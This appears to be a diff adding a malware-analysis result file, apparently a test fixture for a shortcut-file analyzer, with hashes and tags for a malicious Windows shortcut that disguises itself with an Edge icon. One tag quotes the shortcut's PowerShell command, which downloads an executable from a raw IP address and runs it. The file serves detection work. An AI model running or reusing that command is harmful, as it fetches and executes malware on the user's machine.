@@ -1,0 +1,29 @@
+{
+    "response": {
+        "supplementary": [
+            "dd0d30a45f5540b5b7021511f366b794791f0176ffd4337a26e3483d84b87634"
+        ],
+        "extracted": [
+            {
+                "name": "c52e1eb187.ps1",
+                "sha256": "c52e1eb1873da62ae87cd14fd4f20157f46924d33ac606805a99d0c18c39e96e"
+            }
+        ]
+    },
+    "result": {
+        "heuristics": [
+            1
+        ],
+        "tags": {
+            "file.shortcut.icon_location": [
+                "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+            ],
+            "file.shortcut.command_line": [
+                "./powershell.exe Invoke-WebRequest -Uri 'http://20.7.43.70/BkRCY.exe' -OutFile $env:temp\\file.exe; set a=ec; start $env:temp\\file.exe"
+            ],
+            "file.name.extracted": [
+                "./powershell.exe"
+            ]
+        }
+    }
+}
